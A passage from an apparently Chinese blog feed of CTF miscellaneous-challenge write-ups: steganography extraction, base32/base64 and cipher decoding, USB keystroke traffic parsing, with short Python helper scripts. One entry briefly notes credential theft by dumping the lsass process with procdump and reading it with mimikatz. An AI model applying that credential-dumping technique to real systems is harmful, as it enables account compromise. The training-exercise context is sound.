Date/Time     : <span class="number">2020</span>:<span class="number">11</span>:<span class="number">05</span> <span class="number">11</span>:<span class="number">39</span>:<span class="number">24</span>+<span class="number">08</span>:<span class="number">00</span></span><br><span class="line">File Access Date/Time           : <span class="number">2020</span>:<span class="number">11</span>:<span class="number">05</span> <span class="number">11</span>:<span class="number">40</span>:<span class="number">28</span>+<span class="number">08</span>:<span class="number">00</span></span><br><span class="line">File Inode Change Date/Time     : <span class="number">2020</span>:<span class="number">11</span>:<span class="number">05</span> <span class="number">11</span>:<span class="number">40</span>:<span class="number">28</span>+<span class="number">08</span>:<span class="number">00</span></span><br><span class="line">File Permissions                : rw-------</span><br><span class="line">File Type                       : JPEG</span><br><span class="line">File Type Extension             : jpg</span><br><span class="line">MIME Type                       : image/jpeg</span><br><span class="line">Exif Byte Order                 : Big-endian (Motorola, MM)</span><br><span class="line">Software                        : Adobe Photoshop CC <span class="number">2018</span> (Windows)</span><br><span class="line">Artist                          : <span class="number">52</span>HeRtz</span><br><span class="line">XP Comment                      : ⡇⡓⡄⡖⠂⠀⠂⠀⡋⡉⠔⠀⠔⡅⡯⡖⠔⠁⠔⡞⠔⡔⠔⡯⡽⠔⡕⠔⡕⠔⡕⠔⡕⠔⡕⡍=</span><br><span class="line">Padding                         : (Binary data <span class="number">1910</span> bytes, use -b option to extract)</span><br><span class="line">XMP Toolkit                     : Adobe XMP Core <span class="number">5.6</span>-c142 <span class="number">79.160924</span>, <span class="number">2017</span>/<span class="number">07</span>/<span class="number">13</span><span class="number">-01</span>:<span class="number">06</span>:<span class="number">39</span></span><br><span class="line">Authors Position                : <span class="number">52</span>HeRtz</span><br><span class="line">Creator Tool                    : Adobe Photoshop CC <span class="number">2018</span> (Windows)</span><br><span class="line">Creator                         : <span class="number">52</span>HeRtz</span><br><span class="line">Current IPTC Digest             : <span class="number">2</span>adef26c2475bb7c4db0fe45a2cbd2bd</span><br><span class="line">Coded Character Set             : UTF8</span><br><span class="line">Application Record Version      : <span class="number">4</span></span><br><span class="line">Object Name                     : Congratulations！</span><br><span class="line">By-line                         : <span class="number">52</span>HeRtz</span><br><span class="line">By-line Title                   : <span class="number">52</span>HeRtz</span><br><span class="line">IPTC Digest                     : <span class="number">2</span>adef26c2475bb7c4db0fe45a2cbd2bd</span><br><span class="line">Image Width                     : <span class="number">482</span></span><br><span class="line">Image Height                    : <span class="number">482</span></span><br><span class="line">Encoding Process                : Baseline DCT, Huffman coding</span><br><span class="line">Bits Per Sample                 : <span class="number">8</span></span><br><span class="line">Color Components                : <span class="number">3</span></span><br><span class="line">Y Cb Cr Sub Sampling            : YCbCr4:<span class="number">4</span>:<span class="number">4</span> (<span class="number">1</span> <span class="number">1</span>)</span><br><span class="line">Image Size                      : <span class="number">482</span>x482</span><br><span class="line">Megapixels                      : <span class="number">0.232</span></span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-你能看懂音符吗"><a href="#MRCTF2020-你能看懂音符吗" class="headerlink" title="[MRCTF2020]你能看懂音符吗"></a>[MRCTF2020]你能看懂音符吗</h3><p>压缩包不能打开，修改头部，打开之后，打开之后<code>document.XML</code>发现音符，解码拿到flag。</p><h3 id="看网课"><a href="#看网课" class="headerlink" title="看网课"></a>看网课</h3><p>视频分帧，拿到敲击码。</p><p>以<code>/</code>为分割。先行，后列。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">..... ..&#x2F;... .&#x2F;... .&#x2F;... ..&#x2F;</span><br><span class="line">  5,3     3,1    3,1    3,2</span><br><span class="line">   W       L      L      M</span><br></pre></td></tr></table></figure><p>在第<code>7.36s</code>发现第二段信息：<code>dXBfdXBfdXA=</code>。</p><p>使用这个密码解压<code>flag2.zip</code>，解压得到<code>Real flag,jpg</code>，使用<code>010 Ediotr</code>打开搜索关键词<code>ctf</code>即可得到flag。</p><h3 id="HBNIS2018-低个头"><a href="#HBNIS2018-低个头" class="headerlink" title="[HBNIS2018]低个头"></a>[HBNIS2018]低个头</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">题目：低个头</span><br><span class="line"></span><br><span class="line">描述：EWAZX RTY TGB IJN IO KL 请破解该密文 f</span><br><span class="line"></span><br><span class="line">lag格式：XXX 明文</span><br><span class="line"></span><br><span class="line">提交：直接提交明文（大写）</span><br></pre></td></tr></table></figure><p>键盘密码。</p><h3 id="间谍启示录"><a href="#间谍启示录" class="headerlink" title="间谍启示录"></a>间谍启示录</h3><p>运行exe，拿到flag。</p><h3 id="我吃三明治"><a href="#我吃三明治" class="headerlink" title="我吃三明治"></a>我吃三明治</h3><p>binwalk分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady$ binwalk /home/steady/桌面/steady/flag.jpg</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"><span class="number">0</span>             <span class="number">0x0</span>             JPEG image data, JFIF standard <span class="number">1.01</span></span><br><span class="line"><span class="number">37475</span>         <span class="number">0x9263</span>          JPEG image data, JFIF standard <span class="number">1.01</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings 1.jpg</span><br></pre></td></tr></table></figure><p>发现一串字符。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MZWGCZ33GZTDCNZZG5SDIMBYGBRDEOLCGY2GIYJVHA4TONZYGA2DMM3FGMYH2</span><br></pre></td></tr></table></figure><p>base32解密。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"> </span><br><span class="line">print base64.b32encode(&quot;hello world&quot;)</span><br><span class="line">print base64.b32decode(&quot;MZWGCZ33GZTDCNZZG5SDIMBYGBRDEOLCGY2GIYJVHA4TONZYGA2DMM3FGMYH2&#x3D;&#x3D;&#x3D;&quot;)</span><br></pre></td></tr></table></figure><p>base32解密一定要注意后面=的个数。</p><h3 id="DDCTF2018-╯°□°）╯︵-┻━┻"><a href="#DDCTF2018-╯°□°）╯︵-┻━┻" class="headerlink" title="[DDCTF2018](╯°□°）╯︵ ┻━┻"></a>[DDCTF2018](╯°□°）╯︵ ┻━┻</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(╯°□°）╯︵ ┻━┻</span><br><span class="line">50pt</span><br><span class="line"></span><br><span class="line">(╯°□°）╯︵ ┻━┻</span><br><span class="line"></span><br><span class="line">d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd</span><br></pre></td></tr></table></figure><p>长度为<code>134</code>的字符串，按每两位截取的十六进制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[&#39;d4&#39;, &#39;e8&#39;, &#39;e1&#39;, &#39;f4&#39;, &#39;a0&#39;, &#39;f7&#39;, &#39;e1&#39;, &#39;f3&#39;, &#39;a0&#39;, &#39;e6&#39;, &#39;e1&#39;, &#39;f3&#39;, &#39;f4&#39;, &#39;a1&#39;, &#39;a0&#39;, &#39;d4&#39;, &#39;e8&#39;, &#39;e5&#39;, &#39;a0&#39;, &#39;e6&#39;, &#39;ec&#39;, &#39;e1&#39;, &#39;e7&#39;, &#39;a0&#39;, &#39;e9&#39;, &#39;f3&#39;, &#39;ba&#39;, &#39;a0&#39;, &#39;c4&#39;, &#39;c4&#39;, &#39;c3&#39;, &#39;d4&#39;, &#39;c6&#39;, &#39;fb&#39;, &#39;b9&#39;, &#39;b2&#39;, &#39;b2&#39;, &#39;e1&#39;, &#39;e2&#39;, &#39;b9&#39;, &#39;b9&#39;, &#39;b7&#39;, &#39;b4&#39;, &#39;e1&#39;, &#39;b4&#39;, &#39;b7&#39;, &#39;e3&#39;, &#39;e4&#39;, &#39;b3&#39;, &#39;b2&#39;, &#39;b2&#39;, &#39;e3&#39;, &#39;e6&#39;, &#39;b4&#39;, &#39;b3&#39;, &#39;e2&#39;, &#39;b5&#39;, &#39;b0&#39;, &#39;b6&#39;, &#39;b1&#39;, &#39;b0&#39;, &#39;e6&#39;, &#39;e1&#39;, &#39;e5&#39;, &#39;e1&#39;, &#39;b5&#39;, &#39;fd&#39;]</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>转换为10进制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[212, 232, 225, 244, 160, 247, 225, 243, 160, 230, 225, 243, 244, 161, 160, 212, 232, 229, 160, 230, 236, 225, 231, 160, 233, 243, 186, 160, 196, 196, 195, 212, 198, 251, 185, 178, 178, 225, 226, 185, 185, 183, 180, 225, 180, 183, 227, 228, 179, 178, 178, 227, 230, 180, 179, 226, 181, 176, 182, 177, 176, 230, 225, 229, 225, 181, 253]</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>可以发现都是大于128的数，把所有数-128得到ASCII码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[84, 104, 97, 116, 32, 119, 97, 115, 32, 102, 97, 115, 116, 33, 32, 84, 104, 101, 32, 102, 108, 97, 103, 32, 105, 115, 58, 32, 68, 68, 67, 84, 70, 123, 57, 50, 50, 97, 98, 57, 57, 55, 52, 97, 52, 55, 99, 100, 51, 50, 50, 99, 102, 52, 51, 98, 53, 48, 54, 49, 48, 102, 97, 101, 97, 53, 125]</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>ASCII码转换为字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">That was fast! The flag is: DDCTF&#123;922ab9974a47cd322cf43b50610faea5&#125;</span><br></pre></td></tr></table></figure><h3 id="百里挑一"><a href="#百里挑一" class="headerlink" title="百里挑一"></a>百里挑一</h3><p>流量分析。导出http，许多图片。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady/CTF$ exiftool * | grep <span class="string">&quot;flag&quot;</span></span><br><span class="line">XP Comment                      : 恭喜你！找到一半了，还有另一半哦！flag&#123;ae58d0408e26e8f</span><br></pre></td></tr></table></figure><p>另一个在tcp流中找到。</p><h3 id="WUSTCTF2020-alison-likes-jojo"><a href="#WUSTCTF2020-alison-likes-jojo" class="headerlink" title="[WUSTCTF2020]alison_likes_jojo"></a>[WUSTCTF2020]alison_likes_jojo</h3><p>As we known, Alison is a pretty girl。</p><p>在boki.jpg中发现zip，用binwalk命令分离<br>暴力破解后得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WVRKc2MySkhWbmxqV0Zac1dsYzBQUT09</span><br></pre></td></tr></table></figure><p>base64 decode后得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">killerqueen</span><br></pre></td></tr></table></figure><p>jljy.jpg，outguess隐写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -k &quot;killerqueen&quot; -r jljy.jpg out.txt</span><br></pre></td></tr></table></figure><h3 id="安洵杯-2019-Attack"><a href="#安洵杯-2019-Attack" class="headerlink" title="[安洵杯 2019]Attack"></a>[安洵杯 2019]Attack</h3><p>流量包，导出http对象。其中有一个<code>lsass.dmp</code>，分析流量发现使用了。procdump.exe这个工具。该工具一般用来抓取windows的lsass进程中的用户明文密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsass.exe是一个系统重要进程，用于微软Windows系统的安全机制。它用于本地安全和登陆策略。</span><br></pre></td></tr></table></figure><p>获取里面的系统administrator密码，使用<code>mimikatz</code>。</p><h3 id="USB"><a href="#USB" class="headerlink" title="USB"></a>USB</h3><p>其中一个文件binwalk分析。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady$ binwalk -e /home/steady/桌面/steady/key.ftm</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"><span class="number">34741</span>         <span class="number">0x87B5</span>          Zip archive data, at least v2<span class="number">.0</span> to extract, compressed size: <span class="number">4478</span>, uncompressed size: <span class="number">37254</span>, name: key.pcap</span><br><span class="line"><span class="number">39347</span>         <span class="number">0x99B3</span>          End of Zip archive, footer length: <span class="number">22</span></span><br><span class="line"><span class="number">40037</span>         <span class="number">0x9C65</span>          Zip archive data, at least v2<span class="number">.0</span> to extract, compressed size: <span class="number">4478</span>, uncompressed size: <span class="number">37254</span>, name: key.pcap</span><br><span class="line"><span class="number">44643</span>         <span class="number">0xAE63</span>          End of Zip archive, footer length: <span class="number">22</span></span><br></pre></td></tr></table></figure><p>提示usb，就是usb流量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark.exe -r C:\Users\12521\Desktop\key.pcap -T fields -e usb.capdata &gt;flag.txt</span><br></pre></td></tr></table></figure><p>使用脚本提取信息，有冒号–<code>int(line[6:8]</code>，如果没有冒号，<code>int(line[4:6])</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">&quot;A&quot;</span>,  <span class="number">0x05</span>:<span class="string">&quot;B&quot;</span>,  <span class="number">0x06</span>:<span class="string">&quot;C&quot;</span>, <span class="number">0x07</span>:<span class="string">&quot;D&quot;</span>, <span class="number">0x08</span>:<span class="string">&quot;E&quot;</span>, <span class="number">0x09</span>:<span class="string">&quot;F&quot;</span>, <span class="number">0x0A</span>:<span class="string">&quot;G&quot;</span>,  <span class="number">0x0B</span>:<span class="string">&quot;H&quot;</span>, <span class="number">0x0C</span>:<span class="string">&quot;I&quot;</span>,  <span class="number">0x0D</span>:<span class="string">&quot;J&quot;</span>, <span class="number">0x0E</span>:<span class="string">&quot;K&quot;</span>, <span class="number">0x0F</span>:<span class="string">&quot;L&quot;</span>, <span class="number">0x10</span>:<span class="string">&quot;M&quot;</span>, <span class="number">0x11</span>:<span class="string">&quot;N&quot;</span>,<span class="number">0x12</span>:<span class="string">&quot;O&quot;</span>,  <span class="number">0x13</span>:<span class="string">&quot;P&quot;</span>, <span class="number">0x14</span>:<span class="string">&quot;Q&quot;</span>, <span class="number">0x15</span>:<span class="string">&quot;R&quot;</span>, <span class="number">0x16</span>:<span class="string">&quot;S&quot;</span>, <span class="number">0x17</span>:<span class="string">&quot;T&quot;</span>, <span class="number">0x18</span>:<span class="string">&quot;U&quot;</span>,<span class="number">0x19</span>:<span class="string">&quot;V&quot;</span>, <span class="number">0x1A</span>:<span class="string">&quot;W&quot;</span>, <span class="number">0x1B</span>:<span class="string">&quot;X&quot;</span>, <span class="number">0x1C</span>:<span class="string">&quot;Y&quot;</span>, <span class="number">0x1D</span>:<span class="string">&quot;Z&quot;</span>, <span class="number">0x1E</span>:<span class="string">&quot;1&quot;</span>, <span class="number">0x1F</span>:<span class="string">&quot;2&quot;</span>, <span class="number">0x20</span>:<span class="string">&quot;3&quot;</span>, <span class="number">0x21</span>:<span class="string">&quot;4&quot;</span>, <span class="number">0x22</span>:<span class="string">&quot;5&quot;</span>,  <span class="number">0x23</span>:<span class="string">&quot;6&quot;</span>, <span class="number">0x24</span>:<span class="string">&quot;7&quot;</span>, <span class="number">0x25</span>:<span class="string">&quot;8&quot;</span>, <span class="number">0x26</span>:<span class="string">&quot;9&quot;</span>, <span class="number">0x27</span>:<span class="string">&quot;0&quot;</span>, <span class="number">0x28</span>:<span class="string">&quot;\n&quot;</span>, <span class="number">0x2a</span>:<span class="string">&quot;[DEL]&quot;</span>,  <span class="number">0X2B</span>:<span class="string">&quot;    &quot;</span>, <span class="number">0x2C</span>:<span class="string">&quot; &quot;</span>,  <span class="number">0x2D</span>:<span class="string">&quot;-&quot;</span>, <span class="number">0x2E</span>:<span class="string">&quot;=&quot;</span>, <span class="number">0x2F</span>:<span class="string">&quot;[&quot;</span>,  <span class="number">0x30</span>:<span class="string">&quot;]&quot;</span>,  <span class="number">0x31</span>:<span class="string">&quot;\\&quot;</span>, <span class="number">0x32</span>:<span class="string">&quot;~&quot;</span>, <span class="number">0x33</span>:<span class="string">&quot;;&quot;</span>,  <span class="number">0x34</span>:<span class="string">&quot;&#x27;&quot;</span>, <span class="number">0x36</span>:<span class="string">&quot;,&quot;</span>,  <span class="number">0x37</span>:<span class="string">&quot;.&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">nums = []</span><br><span class="line">keys = open(<span class="string">&#x27;out.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    nums.append(int(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</span><br><span class="line">        output += mappings[n]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">&#x27;[unknown]&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;output :\n&#x27;</span> + output</span><br></pre></td></tr></table></figure><p>得到 KEYXINAN<br>维吉尼亚密码：key=<code>XINAN</code>， message = <code>ci&#123;v3erf_0tygidv2_fc0&#125;</code></p><p>栅栏密码解密。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;中国移动&quot;&gt;&lt;a href=&quot;#中国移动&quot; class=&quot;headerlink&quot; title=&quot;中国移动&quot;&gt;&lt;/a&gt;中国移动&lt;/h1&gt;&lt;h2 id=&quot;音频隐写&quot;&gt;&lt;a href=&quot;#音频隐写&quot; class=&quot;headerlink&quot; title=&quot;音频隐写&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="CTF-杂项" scheme="http://s1eady.top/categories/CTF-%E6%9D%82%E9%A1%B9/"/>
    
    
    <category term="CTF-杂项" scheme="http://s1eady.top/tags/CTF-%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
  <entry>
    <title>CTF-杂项刷题1</title>
    <link href="http://s1eady.top/2020/10/07/CTF-%E6%9D%82%E9%A1%B9%E5%88%B7%E9%A2%983/"/>
    <id>http://s1eady.top/2020/10/07/CTF-%E6%9D%82%E9%A1%B9%E5%88%B7%E9%A2%983/</id>
    <published>2020-10-06T20:23:20.000Z</published>
    <updated>2020-11-06T11:51:14.784Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF-show"><a href="#CTF-show" class="headerlink" title="CTF-show"></a>CTF-show</h1><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><h3 id="misc-问青天"><a href="#misc-问青天" class="headerlink" title="misc_问青天"></a>misc_问青天</h3><p>kali分离图片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ foremost /home/steady/桌面/steady/welcome.gif <span class="comment">#//这里直接把图片从压缩包中分离出来。</span></span><br></pre></td></tr></table></figure><p>难道一个压缩包。需要密码。接着查看<code>welcome.gif</code>十六进制。搜索<code>464f524d00</code>(aiff文件头)，接着输入zip密码。解压拿到图片其中将<code>-</code>当作<code>0</code>，<code>|</code> 当作<code>1</code>。二进制转字符串，拿到flag。、</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;01100110 01101100 01100001 01100111 01111011 01100011 01110100 01100110 01011111 01110011 01101000 01101111 01110111 01011111 01101111 01100110 01011111 01100111 01101111 01101100 01100100 01011111 01110010 01100101 01100011 01101111 01110010 01100100 01111101&#x27;</span></span><br><span class="line">s_list = s.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s_list)):</span><br><span class="line">flag += chr(int(s_list[i],<span class="number">2</span>))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="misc50"><a href="#misc50" class="headerlink" title="misc50"></a>misc50</h3><p>打开一张图片，图片比较大，应该藏有东西，直接binwalk、或者formost分离出1个压缩包。压缩包注释写有<code>GEZDGNBVGYFA==== </code>，base32解密，作为密码解压，发现一个txt。发现有重复的3078，开头的3078作为十六进制转字符串是0x。截取其中一部分<code>3078333730783761</code>,转十六进制得<code>0x370x7a</code>,正好是7z压缩包头。写脚本转换一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span>(<span class="params">filepath</span>):</span></span><br><span class="line">    <span class="keyword">with</span> open(filepath) <span class="keyword">as</span> fp:</span><br><span class="line">        content=fp.read();</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line">number = read_file(<span class="string">&#x27;1.txt&#x27;</span>)</span><br><span class="line">result = []</span><br><span class="line">result.append(re.findall(<span class="string">r&#x27;.&#123;2&#125;&#x27;</span>, number))</span><br><span class="line">result = result[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">strings =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    y = bytearray.fromhex(i)</span><br><span class="line">    z = str(y)</span><br><span class="line">    z= re.findall(<span class="string">&quot;b&#x27;(.*?)&#x27;&quot;</span>,z)[<span class="number">0</span>]</span><br><span class="line">    strings += z</span><br><span class="line"></span><br><span class="line">b= strings.split(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">strings=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    <span class="keyword">if</span> len(i) ==<span class="number">1</span>:</span><br><span class="line">        i= <span class="string">&#x27;0&#x27;</span> + i</span><br><span class="line">    strings +=i</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(strings)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拿到压缩包的十六进制，使用winhex制作压缩包。打开之后发现有密码。然后用给的图片放入winhex中发现有一串十六进制，解密拿到压缩包密码。解压之后发现是以<code>tESkpFRktQSjVIVTZUMlBJPQ==</code>结尾，尝试十六进制解密。解密之后还是base64，猜测是循环加密。</p><p>这里使用脚本解密</p><p>base64</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span>(<span class="params">filepath</span>):</span></span><br><span class="line">    <span class="keyword">with</span> open(filepath) <span class="keyword">as</span> fp:</span><br><span class="line">        content=fp.read();</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line">url = read_file(<span class="string">&#x27;test11.txt&#x27;</span>)</span><br><span class="line">url = re.findall(<span class="string">&quot;b&#x27;(.*?)&#x27;&quot;</span>,url)[<span class="number">0</span>]</span><br><span class="line">url = base64.b64decode(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;test12.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(str(url))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>base32</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span>(<span class="params">filepath</span>):</span></span><br><span class="line">    <span class="keyword">with</span> open(filepath) <span class="keyword">as</span> fp:</span><br><span class="line">        content=fp.read();</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line">url = read_file(<span class="string">&#x27;test15.txt&#x27;</span>)</span><br><span class="line">url = re.findall(<span class="string">&quot;b&#x27;(.*?)&#x27;&quot;</span>,url)[<span class="number">0</span>]</span><br><span class="line">url = base64.b32decode(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;test16.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(str(url))</span><br></pre></td></tr></table></figure><p>一共进行了十六次解密。解密之后是一串<code> 